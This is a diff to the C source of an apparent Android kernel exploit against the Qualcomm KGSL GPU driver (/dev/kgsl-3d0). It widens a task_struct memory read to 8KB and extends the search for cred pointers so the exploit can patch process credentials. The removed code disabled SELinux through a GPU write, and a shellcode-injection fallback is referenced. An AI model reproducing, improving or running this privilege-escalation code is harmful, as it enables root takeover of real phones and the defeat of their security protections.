@@ -92,7 +92,7 @@ static void flush_icache(void *addr, size_t len)
 
 static uint64_t find_kernel_base_from_task_va(uint64_t task_va);
 static uint64_t find_offsets_auto(uint64_t kernel_base);
-static int find_cred_pointers_near_comm(int fd, uint64_t task_va, uint8_t *task_data, int comm_off,
+static int find_cred_pointers_near_comm(int fd, uint64_t task_va, uint8_t *task_data, int data_size, int comm_off,
                                        uint64_t *out_cred_ptr, uint64_t *out_real_cred_ptr);
 static uint64_t get_kernel_base(void);
 #define WAIT_STEP_US 1000
@@ -1155,14 +1155,12 @@ static void safe_cred_patch(void)
     }
 
     if (fd < 0) {
-        fprintf(stderr, "[CHILD] [!] fd is invalid (%d), trying to reopen...\n", fd);
         fd = open(DEV_PATH, O_RDWR | O_CLOEXEC);
         if (fd < 0) {
             fprintf(stderr, "[CHILD] [!] Failed to reopen /dev/kgsl-3d0\n");
             gbuf[GBUF_TASK_SPRAY] = 0x1;
             return;
         }
-        fprintf(stderr, "[CHILD] [+] Reopened fd=%d\n", fd);
     }
 
     if (kernel_base == 0) {
@@ -1172,49 +1170,41 @@ static void safe_cred_patch(void)
         fprintf(stderr, "[CHILD] Kernel base: 0x%lx\n", (unsigned long)kernel_base);
     }
 
-    fprintf(stderr, "[CHILD] Step 1: Disabling SELinux via GPU write...\n");
-    if (kernel_base != 0 && selinux_enforcing == 0) {
-        uint64_t auto_offset = find_offsets_auto(kernel_base);
-        selinux_enforcing = kernel_base + (auto_offset != 0 ? auto_offset : SELINUX_OFFSET);
+    // Read 8KB around task_va to handle cross-page task_struct
+    uint8_t *big_task_data = malloc(8192);
+    uint64_t base_va = task_va & ~(uint64_t)0xFFF;
+    if (task_va - base_va < 0x500) {
+        // Marker is at the beginning of the page, task_struct likely starts in the previous page
+        base_va -= 4096;
     }
 
-    if (kernel_base != 0 && selinux_enforcing != 0) {
-        fprintf(stderr, "[CHILD] SELinux virt: 0x%lx kernel_base=0x%lx\n", 
-                (unsigned long)selinux_enforcing, (unsigned long)kernel_base);
-        if (gpu_write_task_u32(fd, selinux_enforcing, 0) == 0) {
-            __sync_synchronize();
-            fprintf(stderr, "[CHILD] SELinux disabled (attempted via GPU write)\n");
-        } else {
-            fprintf(stderr, "[CHILD] [!] SELinux GPU write failed; skipping\n");
-        }
-    }
-
-    fprintf(stderr, "[CHILD] Step 2: Patching cred structure via GPU...\n");
-    uint8_t task_data[4096];
-    if (gpu_read_task_struct(fd, task_va, task_data, 4096) == 0) {
+    fprintf(stderr, "[CHILD] Reading 8KB from 0x%lx for analysis...\n", (unsigned long)base_va);
+    if (gpu_read_task_struct(fd, base_va, big_task_data, 4096) == 0 &&
+        gpu_read_task_struct(fd, base_va + 4096, big_task_data + 4096, 4096) == 0) 
+    {
         uint64_t cred_ptr = 0, real_cred_ptr = 0;
-        
-        // Try dynamic search first (more robust for LPDDR5/xddr5)
         int comm_off = -1;
-        for (int i = 0; i < 4096 - 8; i++) {
-            if (memcmp(task_data + i, MARKER_NAME, 8) == 0) {
+        for (int i = 0; i < 8192 - 8; i++) {
+            if (memcmp(big_task_data + i, MARKER_NAME, 8) == 0) {
                 comm_off = i;
                 break;
             }
         }
         
         if (comm_off != -1) {
-            if (find_cred_pointers_near_comm(fd, task_va, task_data, comm_off, &cred_ptr, &real_cred_ptr)) {
+            if (find_cred_pointers_near_comm(fd, task_va, big_task_data, 8192, comm_off, &cred_ptr, &real_cred_ptr)) {
                 fprintf(stderr, "[CHILD] Dynamic search FOUND cred_ptr=0x%lx\n", (unsigned long)cred_ptr);
             }
         }
         
         if (cred_ptr == 0) {
-            // Fallback to hardcoded offsets
-            cred_ptr = *(uint64_t *)(task_data + OFFSET_CRED);
-            real_cred_ptr = *(uint64_t *)(task_data + OFFSET_REAL_CRED);
-            fprintf(stderr, "[CHILD] Using hardcoded offsets 0x%x/0x%x -> cred_ptr=0x%lx\n", 
-                    OFFSET_CRED, OFFSET_REAL_CRED, (unsigned long)cred_ptr);
+            // Fallback to hardcoded offsets relative to comm if found
+            if (comm_off != -1) {
+                cred_ptr = *(uint64_t *)(big_task_data + comm_off - (OFFSET_COMM - OFFSET_CRED));
+                real_cred_ptr = *(uint64_t *)(big_task_data + comm_off - (OFFSET_COMM - OFFSET_REAL_CRED));
+                fprintf(stderr, "[CHILD] Using relative offsets from comm 0x%x -> cred_ptr=0x%lx\n", 
+                        comm_off, (unsigned long)cred_ptr);
+            }
         }
 
         if (cred_ptr != 0 && (cred_ptr & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
@@ -1224,6 +1214,7 @@ static void safe_cred_patch(void)
             }
         }
     }
+    free(big_task_data);
 
     if (!patched) {
         fprintf(stderr, "[CHILD] Step 3: Falling back to shellcode injection...\n");
@@ -1559,14 +1550,18 @@ static int find_marker_in_page(uint8_t *page_data, size_t page_size, uint64_t cu
     return 0;
 }
 
-static int find_cred_pointers_near_comm(int fd, uint64_t task_va, uint8_t *task_data, int comm_off,
+static int find_cred_pointers_near_comm(int fd, uint64_t task_va, uint8_t *task_data, int data_size, int comm_off,
                                        uint64_t *out_cred_ptr, uint64_t *out_real_cred_ptr)
 {
     uid_t my_uid = getuid();
-    int search_start = comm_off - 512;
+    // Search 1024 bytes before and after comm
+    int search_start = comm_off - 1024;
+    int search_end = comm_off + 1024;
     if (search_start < 0) search_start = 0;
+    if (search_end > data_size - 8) search_end = data_size - 8;
 
-    fprintf(stderr, "[CRED_SEARCH] Searching near comm_off 0x%x (my_uid=%d)\n", comm_off, my_uid);
+    fprintf(stderr, "[CRED_SEARCH] Searching range [0x%x - 0x%x] near comm_off 0x%x (my_uid=%d)\n", 
+            search_start, search_end, comm_off, my_uid);
 
     for (int off = comm_off - 8; off >= search_start; off -= 8)
     {
@@ -1584,7 +1579,6 @@ static int find_cred_pointers_near_comm(int fd, uint64_t task_va, uint8_t *task_
             if (usage > 0 && usage < 10000 && uid == my_uid)
             {
                 *out_cred_ptr = ptr;
-                // real_cred is usually right before cred
                 uint64_t ptr2 = *(uint64_t *)(task_data + off - 8);
                 if ((ptr2 & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL)
                     *out_real_cred_ptr = ptr2;
